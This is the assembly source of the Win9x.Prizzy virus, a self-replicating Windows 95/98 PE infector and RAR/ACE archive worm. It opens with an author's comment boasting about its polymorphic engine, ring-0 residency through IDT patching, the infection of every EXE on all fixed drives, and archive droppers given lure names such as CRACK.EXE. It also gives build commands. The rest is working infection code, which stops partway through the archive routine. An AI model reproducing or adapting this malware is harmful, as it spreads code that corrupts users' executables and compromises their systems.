   ;
   ;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿
   ;  : Prizzy/29A :        Win9x.Prizzy             : Prizzy/29A :
   ;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ
   ;
   ;             made in the Czech Republic
   ;
   ;   I am very proud on  my very first virus  at Windows 95/98  platform. It
   ;   infects EXE files in a format of PE (Portable Executable) for operation
   ;   system Windows 95/98. And also Win9x.Prizzy is a virus-worm for RAR/ACE
   ;   archives - how cleanly  RAR/ACE  so it infects  in a format of SFX-EXE.
   ;
   ;   When infected PE file  is started,  the virus  receives  management and
   ;   polymorphic decoder (Prizzy Polymorphic Engine - PPE) decipher the base
   ;   code of a virus. This PPE can generate a lot of garbages and for decod-
   ;   ing uses MMX  and  Coprocessor instructions like next registers of CPU.
   ;
   ;   When the PPE finished, the virus calls the routine  to get the original
   ;   base address  of KERNEL32.DLL. Then  virus searches for GetProcAddressA
   ;   in  the import  table. This API function  it uses  to get GetDriveTypeA
   ;   address - which Win9x.Prizzy uses by hyper-infection (see below).
   ;
   ;   To resident, it  patches the IDT, it  isn't protected in Windows 95/98,
   ;   modifies  the INT 3 vector to  point code into  the virus,  and execute
   ;   this  interrupt. As  the code is  executed  in ring0,  the virus  alloc
   ;   memory (IFSMgr_GetMem) and  hooks (IFSMgr_InstallFileSystemApiHook) for
   ;   works with files. Because  the author discovered IFS errors, Prizzy can
   ;   hooks only opened files (read more below).
   ;
   ;
   ;            New technics in the VX scene
   ;           ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;
   ;   Prizzy Polymorphic Engine (PPE)
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   I'm very proud on my very good polymorphic engine because  as the first
   ;   virus it  can generate  decoding decoding loop  in  MMX and Coprocessor
   ;   instructions. I would like to remind decoder couldn't  supports MMX and
   ;   copro instructions  at one bout  (because MMX has been built on copro).
   ;
   ;   What instructions I can generate:
   ;   * 149 type of base-instructions (37 from GriYo/29A, thanks)
   ;   * 43  type of copro-instructions
   ;   * 46  type of MMX-instructions
   ;
   ;   But no every computer, where is Windows 95/98,  do not need be CPU with
   ;   MMX technology. So, I use CPUID instruction to get result. But this in-
   ;   struction CPU supports on 486+, if it isn't  supports  the PPE use only
   ;   coprocessor.
   ;
   ;   I  can  generate  some  more  difficult garbage,  as  are  instructions
   ;   CMPS/LODS/STOS/SCAS/MOVS (and set their regz), CALL/JMP reg32, or iluzo
   ;   return  (find "g_iluzo_return:" for more infoz - this  garbage simulate
   ;   the end of decoding - jump to  non-decoded  virus body), or the garbage
   ;   which  simulate  decoding compare (find "g_compare:" for  more  infoz).
   ;
   ;   Some beastly doing functions are termed as "sado-maso function" as are:
   ;   * reg + garbage + dec reg + jnz reg
   ;   * encryption a destination value
   ;   * putting CPUID and MMX test to poly-decode loop
   ;   and so on...
   ;
   ;   For many infoz find "ppe_startup:" and "__no_flags_1:" in this file.
   ;
   ;
   ;   Hyper infection
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   By this function Win9x.Prizzy can  infect  all files  on disks  at very
   ;   little time. To Prizzy gots type of drive (if it isn't CD-ROM, RAM-DISK
   ;   NETWORK, FLOPPY...) must it uses GetDriveTypeA API function. Then every
   ;   three  second is  active "init_search:" which  scans  all EXE  files on
   ;   disks and  then Prizzy infect them. But  Prizzy must give time to other
   ;   Windows application, infection NEVER takes more then one second. Do you
   ;   think it's little ? No, it isn't, I did  some tests :). This  code  was
   ;   designed to it could serves in other viruses which you will write.
   ;
   ;
   ;   Infection ACE/RAR and ACE/RAR EXE-SFX (DOS, Win 95/98) archivez
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   I am  very glad Win9x.Prizzy is  the first virus  which infects ACE/RAR
   ;   archives as  cleanly ACE/RAR format so  RAR-SFX/ACE-SFX (German/English
   ;   version). And because in EXE-PE can be saved comment and many infoz, my
   ;   RAR/ACE infector searches a piece of code to find the archive's header.
   ;   Then it  checks  VolumeNumber value if it isn't C00 (ACE) or R00 (RAR),
   ;   it checks TimeDate  if is divided by 85,  if not,  Prizzy writes on the
   ;   end of  archive any  infected file  (which it  is infected and with the
   ;   smallest size),  add new FileHeader and  calculate CRC32 for header and
   ;   for reserved file-dropper. Dropper's name is selected from these titles
   ;   INSTALL, SETUP, RUN, SOUND, CONFIG, HELP, GRATIS, CRACK and README.  To
   ;   that  generated title is add + EXE and  to last of  the  3rd titles can
   ;   generate '!' char as is (!GRATIS.EXE or CRACK!.EXE etc.).
   ;
   ;
   ;                  Greetings
   ;                 ÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   And finnaly the greatings go to:
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;     GriYo/29A ........ I understood principle of poly-tables thank you :)
   ;     Darkman/29A ...... thx for contact 29A, correct my english, thanks
   ;     Z0mbie/29A ....... for IDT orientation - btw, he never answered me :)
   ;     Sexy/29A ......... your Sexy has too bugs, I'd to do anti-sexy, know y?
   ;     Lucciana, Melon .. thanks for correct my spanish learning by you
   ;
   ;
   ;   Compiling it
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄ
   ;     tasm32 -ml -m5 -q -zn prizzy.asm
   ;     tlink32 -Tpe -c -x -aa prizzy,,, import32
   ;     pewrsec prizzy.exe
   ;
   ;

           .386p
           .model  flat,STDCALL

           include Include\MZ.inc
           include Include\PE.inc
           include Include\Win32API.inc
           include Include\Hiew_VMM.inc
           include Include\Useful.inc

           extrn   MessageBoxA:proc
           extrn   ExitProcess:proc

   ;ÄÄÄ´ some equ's needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ;DEBUG       equ     YEZ             ;only for debug and 1st start
   mem_size    equ (mem_end-virus_start)   ;size of virus in memory
   file_size   equ (file_end-virus_start)  ;size of virus in file

   IFDEF DEBUG
   infect_minsize  equ 4096            ;my test-PE file has 4096b
   ELSE
   infect_minsize  equ 16384           ;only filez bigger then 16K
   ENDIF
   infect_maxsize  equ 100*1024*1024       ;to 100Mb

   access_ebx  equ (dword ptr 16)      ;access into stack when
   access_edx  equ (dword ptr 20)      ;will be use pushad
   access_ecx  equ (dword ptr 24)
   access_eax  equ (dword ptr 28)

   search_mem_size equ 100*(size dta+size search_address)

   ;ÄÄÄ´ some structurez for virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ifs_onstack     struc
               dd  ?       ;saved ebp
               dd  ?       ;return address
               dd  ?       ;the address of the FSD function that is to be called for this API
   _function       dd  ?       ;the function that is being performed
   _drive          dd  ?       ;the 1-based drive the operation is being performed on (-1 if UNC)
               dd  ?       ;the kind of resource the operation is being performed on
   _codepage       dd  ?       ;the codepage that the user string was passeed in on
   _ioreq_ptr      dd  ?       ;pointer to IOREQ structure
               ends

   dta_struc       struc           ;dta struc for FindFile
   dta_fileattr        dd  ?
   dta_time_creation   dq  ?
   dta_time_lastaccess dq  ?
   dta_time_lastwrite  dq  ?
   dta_filesize_hi     dd  ?
   dta_filesize        dd  ?
   dta_reserved_0      dd  ?
   dta_reserved_1      dd  ?
   dta_filename        db  260 dup (?)
   dta_filename_short  db  14 dup (?)
               ends

   ;ÄÄÄ´ some equ's from IFS.INC ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   R0_OPENCREATFILE    equ 0D500h      ;Open/Create a file
   R0_READFILE     equ 0D600h      ;Read a file, no context
   R0_WRITEFILE        equ 0D601h      ;Write to a file
   R0_CLOSEFILE        equ 0D700h      ;Close a file
   R0_GETFILESIZE      equ 0D800h      ;Get size of a file
   R0_FINDFIRSTFILE    equ 04E00h      ;Do a LFN FindFirst operation
   R0_FINDNEXTFILE     equ 04F00h      ;Do a LFN FindNext operation
   R0_FINDCLOSEFILE    equ 0DC00h      ;Do a LFN FindClose operation
   R0_FILEATTRIBUTES   equ 04300h      ;Get/Set Attributes of a file
   GET_ATTRIBUTES      equ 00h
   SET_ATTRIBUTES      equ 01h

   IFSFN_OPEN      equ 36
   IFSFN_RENAME        equ 37      ;this ain't use here 'cause
   IFSFN_FILEATTRIB    equ 33      ;they has got bad values !!

   ;ÄÄÄ´ some useful macroz ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   get_base        macro   reg     ;get address where we're
               call    $+5
               pop reg
               sub reg,$-1-virus_start
               endm

   VxDCall         macro   service     ;standard VxD call rutinue
               db  0CDh
               db  020h
               dd  service
               endm

   VMMCall         macro   service     ;VxD call like VMM
               VxDCall VMM_&service&
               endm

   ;ÄÄÄ´ prepare to virus start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   .data
           db  ?
   .code

   ;ÄÄÄ´ virus code starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   virus_start:
           get_base ebp            ;get entry point to ebp

           mov eax,ebp
           db  2Dh         ;sub eax,infected_ep
   infected_ep:    dd  00000000
           db  05h         ;add eax,original_ep
   original_ep:    dd  00000000
           xchg    eax,ebx

           cmp [esp].byte ptr 3,0BFh
           jnz jump_host       ;jump if WinNT

           call    find_kernel32       ;find kernel's base address
           call    get_disks       ;search fixed, cd-rom, etc

           lea eax,[ebp+my_idt-virus_start]

           push    edi         ;save
           sidt    fword ptr [esp-2]   ;Interrupt Descriptor Table
           pop edi         ;(IDT) to EDI
           add edi,8*3         ;it'll be int #3

           mov ecx,[edi]       ;save int #3 IDT
           mov [ebp+last_idt-virus_start],ecx
           mov ecx,[edi+04h]
           mov [ebp+last_idt+04h-virus_start],ecx

           stosw
           scasw
           mov ah,0EEh         ;flags of descriptor
           mov [edi],eax

           push    es          ;if you wanna see IDT struc
           push    ds          ;visit >z0mbie2.asm< for more
           push    gs          ;informations
           push    fs
           int 3           ;go to ring-0 !!
           cli
           pop fs          ;make SoftICE well...
           pop gs          ;this was fucking bug !
           pop ds
           pop es
           sti

       jump_host:
           push    ebx
           mov eax,ebx         ;do all appz well...
           ret

       __iluzo_return_1:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ new int #3 function ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   my_idt:
           pusha               ;save all regz and flagz
           pushf

           mov ebx,[ebp+last_idt-virus_start]
           mov [edi-4],ebx     ;restore int3 descriptor form
           mov ebx,[ebp+last_idt+04h-virus_start]
           mov [edi],ebx

           xchg    al,[edi]        ;this byte should be zero
           scasb               ;is there zero or not ?
           jz  my_idt_out      ;it's already resident

           push    mem_size        ;size of this virus in memory
           VxDCall IFSMGR_GetHeap      ;alloc memory
           pop ecx         ;get dword from stack to ecx
           sub ecx,mem_size - file_size

           mov edi,eax         ;edi=new destination
           push    edi         ;save it
           mov esi,ebp         ;source of virus body
           cld
           rep movsb           ;copy virus
           pop edi

           lea eax,[edi+api_hook-virus_start]  ;hook API function
           push    eax
           VxDCall IFSMGR_InstallFileSystemApiHook
           add esp,4           ;put last EAX from stack
                           ;instead check result
           mov [edi+api_hook_prev-virus_start],eax ;prev API hook
           mov dword ptr [edi+Archive_Filename_Sz-virus_start],00000000h
           mov byte ptr [edi+search_start-virus_start],00h
           mov byte ptr [edi+search_finished-virus_start],00h

   my_idt_out:
           popf
           popa
           iret

       __iluzo_return_2:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ hook API functionz ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   api_hook:
           push    ebp         ;C calls rules
           mov ebp,esp
           sub esp,100h

           pusha
           get_base ebx            ;get address to ebx

           cmp byte ptr [ebx+in_ifs-virus_start],0
           jnz api_hook_quit
           inc byte ptr [ebx+in_ifs-virus_start]

           ;***    active my hyper infection ?
           cmp byte ptr [ebx+search_finished-virus_start],0
           jnz api_hook_next

           push    ebx         ;every three second run
           xor ax,ax           ;my hyper infection; I must
           out 70h,al          ;get time other appz
           in  al,71h
           mov bl,3            ;every three second...
           div bl
           pop ebx
           or  ah,ah           ;divided by three ?
           jnz api_hook_next

           call    init_search     ;hyper infication !

       api_hook_next:
           cmp dword ptr [ebp]._function,IFSFN_OPEN
           jnz api_hook_exit

       api_hook_action:
           lea edi,[ebx+filename-virus_start]  ;edi = filename buffer
           mov [ebx+filename_ptr-virus_start],edi

           cld
           mov eax,[ebp]._drive    ;drive
           cmp al,-1
           jz  api_hook_exit
           or  al,al
           jz  api_hook_exit
           add al,'A'-1        ;convert to letter
           cmp al,'A'
           jl  api_hook_exit
           cmp al,'Z'
           jg  api_hook_exit
           stosb               ;drive letter first
           mov al,':'
           stosb

           mov eax,[ebp]._codepage ;BCS_WANSI/BCS_OEM
           push    eax
           push    filename_size-1     ;max name length
           mov eax,[ebp]._ioreq_ptr+8
           mov eax,[eax]+0Ch       ;filename
           add ax,4
           push    eax         ;uni-str
           push    edi         ;output-str
           VxDCall IFSMGR_UniToBCSPath
           add esp,4*4         ;remove from stack

           mov byte ptr [edi+eax],0    ;ASCIIZ

           call    infect_file

   api_hook_exit:
           mov byte ptr [ebx+in_ifs-virus_start],0
   api_hook_quit:
           popa
           push    dword ptr [ebp+1Ch] ;prepare to jump back
           push    dword ptr [ebp+18h]
           push    dword ptr [ebp+14h]
           push    dword ptr [ebp+10h]
           push    dword ptr [ebp+0Ch]
           push    dword ptr [ebp+08h]

           db  0b8h
   api_hook_prev:  dd  12345678h
           call    [eax]           ;go to last API func.

   api_hook_finish:
           add esp,6*4

           leave               ;SP<-BP, POP BP
           ret             ;jump back !

       __iluzo_return_3:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ main function for infect file ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   infect_file:
           pusha
           get_base ebx
           mov edi,[ebx+filename_ptr-virus_start]

       IFDEF DEBUG
           cmp [edi],'X\:D'        ;infect files only in my
           jnz infect_file_exit    ;special directory
       ENDIF

           cld
           mov al,'.'          ;search this char
           mov cx,filename_size    ;max filename_size
           repnz   scasb           ;searching...
           dec edi         ;set to that char
           cmp al,[edi]        ;check again !
           jnz infect_file_exit    ;shit, bad last char

       IFDEF DEBUG
           mov eax,[edi-4]     ;you can infect only
           cmp eax,'DCBA'      ;this file on my disk
           jnz infect_file_exit    ;i won't risk
       ENDIF

           int 4           ;my S-ICE breakpoint

           get_base ebp            ;where we're to ebp
           mov ecx,1+2+4+32        ;attrib
           mov edx,[ebp+filename_ptr-virus_start]
           lea esi,[ebp+dta-virus_start]
           call    ffindfirst      ;get dta structure
           jc  infect_file_exit
           call    ffindclose

           mov eax,[edi]       ;get ext of file
           cmp eax,'EXE.'      ;is it EXE file ?
           jnz next_ext_1
           call    infect_ACE_RAR      ;is it ACE/RAR EXE-SFX file ?
           jnc infect_file_exit
           jmp next_ext_end
       next_ext_1:
           cmp eax,'ECA.'      ;is it ACE archive file ?
           jnz next_ext_2
           call    infect_ACE_RAR
           jmp infect_file_exit
       next_ext_2:
           cmp eax,'RAR.'      ;is it RAR archive file ?
           jnz infect_file_exit
           call    infect_ACE_RAR
           jmp infect_file_exit
       next_ext_end:
           mov eax,[ebp+dta.dta_filesize-virus_start]
           cmp eax,infect_minsize  ;is filesize smaller ?
           jb  infect_file_exit
           cmp eax,infect_maxsize  ;is filesize bigger ?
           ja  infect_file_exit

           mov edx,[ebp+filename_ptr-virus_start]
           mov ecx,32          ;set attribs
           call    fsetattr
           jc  infect_file_exit

           mov edx,[ebp+filename_ptr-virus_start]
           call    fopen           ;open file !
           jc  infect_file_restattr
           mov [ebp+file_handle-virus_start],eax

           lea edx,[ebp+mz_header-virus_start]
           mov ecx,IMAGE_SIZEOF_DOS_HEADER
           mov ebx,[ebp+file_handle-virus_start]
           xor esi,esi         ;file pos
           call    fread           ;read msdos header
           jc  infect_file_close

           mov ax,[ebp+mz_header.MZ_magic-virus_start]
           cmp ax,IMAGE_DOS_SIGNATURE  ;test 'MZ'
           jnz infect_file_close

           mov ax,[ebp+mz_header.MZ_crlc-virus_start]
           or  ax,ax           ;no PE ?
           jz  __okay
           mov ax,[ebp+mz_header.MZ_lfarlc-virus_start]
           cmp ax,40h          ;bad PE ?
           jb  infect_file_close

   __okay:     mov esi,[ebp+mz_header.MZ_lfanew-virus_start]
           lea edx,[ebp+pe_signature-virus_start]
           mov ecx,IMAGE_SIZEOF_FILE_HEADER + \
                   IMAGE_SIZEOF_NT_OPTIONAL_HEADER + \
                   00000004h       ;size of PE to read
           mov ebx,[ebp+file_handle-virus_start]
           call    fread
           jc  infect_file_close
           add esi,ecx         ;esi=1st section

           cmp dword ptr [ebp+pe_signature-virus_start], \
               IMAGE_NT_SIGNATURE
           jnz infect_file_close   ;is it really 'PE\0\0' ?

           mov eax,dword ptr [ebp+pe_header + \
               FH_TimeDateStamp-virus_start]
           xor edx,edx
           mov ecx,85
           div ecx         ;infected ?
           or  edx,edx
           jz  infect_file_close

           mov ax,[ebp+pe_header.FH_Characteristics-virus_start]
           test    ax,IMAGE_FILE_EXECUTABLE_IMAGE
           jz  infect_file_close
           test    ax,IMAGE_FILE_DLL   ;no DLL ?
           jnz infect_file_close

           movzx   ecx,word ptr [ebp+pe_header + \
               FH_NumberOfSections-virus_start]
           dec ecx
           mov eax,IMAGE_SIZEOF_SECTION_HEADER
           mul ecx         ;eax=offs of last section

           add esi,eax         ;esi=offs of l.s. in file
           mov [ebp+pe_actsection-virus_start],esi
           lea edx,[ebp+pe_section-virus_start]
           mov ecx,IMAGE_SIZEOF_SECTION_HEADER
           mov ebx,[ebp+file_handle-virus_start]
           call    fread           ;read last section
           jc  infect_file_close

           mov eax,dword ptr [ebp+pe_section+SH_Characteristics-virus_start]
           test    eax,IMAGE_SCN_CNT_CODE or \
                   IMAGE_SCN_MEM_EXECUTE or \
                   IMAGE_SCN_MEM_READ
           jz  infect_file_close   ;has l.s. these flags ?

           ; alloc memory for polymorphic engine
           mov eax,file_size + 2000h
           call    malloc
           mov [ebp+mem_address-virus_start],eax
           add eax,file_size
           mov [ebp+poly_start-virus_start],eax

           mov eax,dword ptr [ebp+pe_optional + \
               OH_AddressOfEntryPoint-virus_start]
           mov dword ptr [ebp+original_ep-virus_start],eax ;save old entry-point

           mov eax,[ebp+dta.dta_filesize-virus_start]

           add eax,dword ptr [ebp+pe_section + \   ;new SH_VirtualAddress
               SH_VirtualAddress-virus_start]
           sub eax,dword ptr [ebp+pe_section + \   ;new SH_PointerToRawData
               SH_PointerToRawData-virus_start]
           mov [ebp+infected_ep-virus_start],eax   ;RVA of virus code
           add eax,file_size

           mov dword ptr [ebp+pe_optional + \
               OH_AddressOfEntryPoint-virus_start],eax ;New entry-point

           ; run Prizzy Polymophic Engine (PPE)
           call    ppe_startup

           mov esi,[ebp+dta.dta_filesize-virus_start]
           add esi,[ebp+poly_finish-virus_start]  ;eax=size of virus in file

           add dword ptr [ebp+pe_section + \   ;new SH_SizeOfRawData
               SH_SizeOfRawData-virus_start],esi
           add dword ptr [ebp+pe_optional + \  ;new OH_SizeOfImage
               OH_SizeOfImage-virus_start],esi
           lea edx,[esi+mem_size-file_size]
           add dword ptr [ebp+pe_section + \   ;new SH_VirtualSize
               SH_VirtualSize-virus_start],edx
           or  dword ptr [ebp+pe_section + \   ;set these flags
               SH_Characteristics-virus_start], \
               IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or \
               IMAGE_SCN_MEM_WRITE

           mov eax,03030302h               ;special number
           call    ppe_get_rnd_range
           inc eax                 ;it can't be zero
           imul    eax,85                  ;encrypt one
           mov dword ptr [ebp+pe_header + \
               FH_TimeDateStamp-virus_start],eax

           mov esi,[ebp+dta.dta_filesize-virus_start]
           mov edx,[ebp+mem_address-virus_start]
           mov ecx,[ebp+poly_finish-virus_start]
           mov ebx,[ebp+file_handle-virus_start]
           call    fwrite          ;write it

           ; dealloc memory for PPE
           mov eax,[ebp+mem_address-virus_start]
           call    mdealloc

           mov esi,[ebp+pe_actsection-virus_start]
           lea edx,[ebp+pe_section-virus_start]
           mov ecx,IMAGE_SIZEOF_SECTION_HEADER
           mov ebx,[ebp+file_handle-virus_start]
           call    fwrite          ;write section into PE

           mov esi,[ebp+mz_header.MZ_lfanew-virus_start]
           lea edx,[ebp+pe_signature-virus_start]
           mov ecx,IMAGE_SIZEOF_FILE_HEADER + \
                   IMAGE_SIZEOF_NT_OPTIONAL_HEADER + \
                   00000004h
           mov ebx,[ebp+file_handle-virus_start]
           call    fwrite          ;write PE header

           mov eax,[ebp+dta.dta_filesize-virus_start]
           cmp dword ptr [ebp+Archive_Filename_Sz-virus_start],0
           jnz __Archive_Update_2
       __Archive_Update:
           cmp eax,150000
           ja  infect_file_close
           mov esi,[ebp+filename_ptr-virus_start]
           lea edi,[ebp+Archive_Filename-virus_start]
           mov ecx,filename_size
           cld
           rep movsb
           mov eax,[ebp+dta.dta_filesize-virus_start]
           mov [ebp+Archive_Filename_Sz-virus_start],eax
           jmp infect_file_close

       __Archive_Update_2:
           mov eax,[ebp+dta.dta_filesize-virus_start]
           cmp [ebp+Archive_Filename_Sz-virus_start],eax
           jb  __Archive_Update

   infect_file_close:
           mov ebx,[ebp+file_handle-virus_start]
           call    fclose

   infect_file_restattr:
           mov edx,[ebp+filename_ptr-virus_start]
           mov ecx,[ebp+dta.dta_fileattr-virus_start]
           call    fsetattr

   infect_file_exit:
           popa
           ret

       __iluzo_return_4:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ main function of infect all filez on disks ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   init_search:
           pusha
           get_base ebp            ;where we're into ebp

           cmp byte ptr [ebp+search_start-virus_start],00h
           jnz __continue
           mov byte ptr [ebp+search_start-virus_start],01h
           xor al,al
           out 70h,al
           in  al,71h
           mov bl,al           ;actual sec to bl

           push    search_mem_size     ;size of mem for searching
           VxDCall IFSMGR_GetHeap
           pop ecx

           or  eax,eax         ;were we sucessful ?
           jz  init_search_error
           mov [ebp+search_address-virus_start],eax

           mov eax,005C3A43h       ;'C:\\0'
           mov [ebp+search_filename-virus_start],eax
       __searching:
           mov byte ptr [ebp+search_plunge-virus_start],00h
           jmp search_all_dirs
       __searching_end:
           cmp byte ptr [ebp+search_filename-virus_start],'Z'
           jz  init_search_done
           inc byte ptr [ebp+search_filename-virus_start]
           mov word ptr [ebp+search_filename-virus_start+2],005Ch

           ; what disk is it ? fixed ? cd-rom ? ram-disk ? etc. ?
           mov cl,'A'
           sub cl,[ebp+search_filename-virus_start]
           neg cl
           mov eax,00000001h
           shl eax,cl          ;convert to BCD
           test    [ebp+gdt_flags-virus_start],eax
           jnz __searching     ;may I "use" this disk ?
           jmp __searching_end     ;uaaaaah, i'm crazy... :)

   init_search_exit:
           push    dword ptr [ebp+search_address-virus_start]
           VxDCall IFSMGR_RetHeap      ;deallocate memory
           pop ecx

   init_search_error:
           popa                ;restore all regz
           ret

   init_search_done:               ;all disks infected?
           mov byte ptr [ebp+search_finished-virus_start],01h
           jmp init_search_exit

       __iluzo_return_5:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   search_all_dirs:
           call    __get_last_char     ;pointer of l.c. to edi
           mov [edi],58452E2Ah     ;'*.EX'
           mov word ptr [edi+4],0045h  ;'\0E'

           call    __calc_in_mem       ;offs dta in mem to esi

           lea edx,[ebp+search_filename-virus_start]
           mov ecx,1+2+4+32            ;set attribs
           call    ffindfirst
           mov [esi-size search_handle],eax    ;save handle
           jc  __find_dir      ;error ?

       __repeat:
           call    __clean         ;delete '*.EXE'
           push    esi
           lea esi,[esi].dta_filename  ;and add file name
          __r2:lodsb
           stosb
           or  al,al           ;copy with zero char
           jnz __r2
           pop esi         ;restore esi=dta in memory

           lea edx,[ebp+search_filename-virus_start]
           mov [ebp+filename_ptr-virus_start],edx
           call    infect_file     ;infect it ! haha huahaha...

           xor al,al           ;give time other appz
           out 70h,al
           in  al,71h
           cmp bl,al           ;Warning! BL was fill above!
           jnz init_search_error   ;EBX isn't anywhere modify !

       __continue:
           call    __calc_in_mem       ;esi=dta in memory
           mov eax,[esi-size search_handle]    ;handle of FindFirstFile
           call    ffindnext
           jnc __repeat
           call    ffindclose

        __find_dir:
           call    __clean         ;remove file name
           mov [edi],002A2E2Ah     ;add '*.*',0

           call    __calc_in_mem
           lea edx,[ebp+search_filename-virus_start]
           mov ecx,10h         ;set attribs
           call    ffindfirst      ;search directory "only"
           mov [esi-size search_handle],eax
           jc  __search_exit

    __find_in_dir:
           test    [esi].dta_fileattr,10h  ;is it directory ?
           jz  __find_next
           cmp [esi].dta_filename,'.'  ;it can't be directory
           jz  __find_next

           inc byte ptr [ebp+search_plunge-virus_start]

           call    __get_last_char     ;edi=last char of filename
           lea esi,[esi].dta_filename  ;esi=filename

           call    __clean         ;remove '*.EXE'

       __copy: lodsb               ;copy directory name and
           stosb               ;set '\' at the end
           or  al,al
           jnz __copy
           mov word ptr [edi-1],005Ch  ;'\\0'

           jmp search_all_dirs     ;search in new directory

       __find_next:
           call    __calc_in_mem
           mov eax,[esi-size search_handle]
           call    ffindnext
           jnc __find_in_dir

     __search_exit:
           call    __clean         ;remove file name and '\'
           mov byte ptr [edi-1],0  ;it's out of directory
           dec byte ptr [ebp+search_plunge-virus_start]
           cmp byte ptr [ebp+search_filename-virus_start+2],0
           jz  __searching_end
           jmp __find_next

     __calc_in_mem:                ;get pointer to dta in memory
           movzx   esi,byte ptr [ebp+search_plunge-virus_start]
           imul    esi,size dta+size search_handle
           add esi,[ebp+search_address-virus_start]
           add esi,size search_handle
           ret

   __get_last_char:                ;edi=last char+1 in filename
           lea edi,[ebp+search_filename-virus_start]
           mov ecx,filename_size
           xor al,al
           cld
           repnz   scasb
           dec edi
           ret

       __clean:                ;clean last item in filename
           lea edx,[ebp+search_filename-virus_start]
           call    __get_last_char
           __2:mov byte ptr [edi],0
           dec edi
           cmp byte ptr [edi],'\'
           jnz __2
           inc edi
           ret

       __iluzo_return_6:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ infection in ACE/RAR and ACE/RAR EXE-SFX archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ We Already Know ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;   þ ACE/RAR archive certainly exists
   ;   þ in _filename_ has his name
   ;   þ dta is full
   ;
       archive_header_first    dd  ?
       archive_read_length dd  ?

       errors          dw  ?
   ;
   ; 0.bit     ... fail this function definitived (once for all)
   ; 1.bit     ... allocate buffer for search Archive Magic (Archive_Buffer)
   ; 2.bit     ... set attribs of file (filename_ptr)
   ; 3.bit     ... allocate memory for header
   ; 4.bit     ... open file (file_handle = filename_ptr)
   ; 5.bit     ... open file (dropper_handle = archive_filename)
   ; 6.bit     ... allocate dropper_memory (loaded dropper file)
   ;

   infect_ACE_RAR:

           mov word ptr [ebp+errors-virus_start],0
           or  word ptr [ebp+errors-virus_start],Archive_Err

           mov edx,[ebp+filename_ptr-virus_start]
           mov ecx,32          ;set attribs
           call    fsetattr
           jc  exit_now
           or  word ptr [ebp+errors-virus_start],100b

           call    prepare_file        ;eax=CRC32, edi=filepos, ebx=ACE_Archive or RAR_Archive
           jz  exit_now
           and word ptr [ebp+errors-virus_start],1111111111111110b

           cmp ebx,RAR_Archive     ;is it really ACE or RAR ?
           jz  infect_RAR      ;jump if RAR or EXE-SFX RAR
           mov [ebp+ACEf_CRC32-virus_start],eax

           call    __ar_load_header

           test    word ptr [edx+ACEh_HeadFlags-ACE_header_start],2048
           jnz exit_now        ;mult. volume ?

           movzx   edi,word ptr [edx+ACEh_HeadSize-ACE_header_start]
           add edi,4               ;add head.crc and head.size
           add edi,edx             ;absolute start in memory
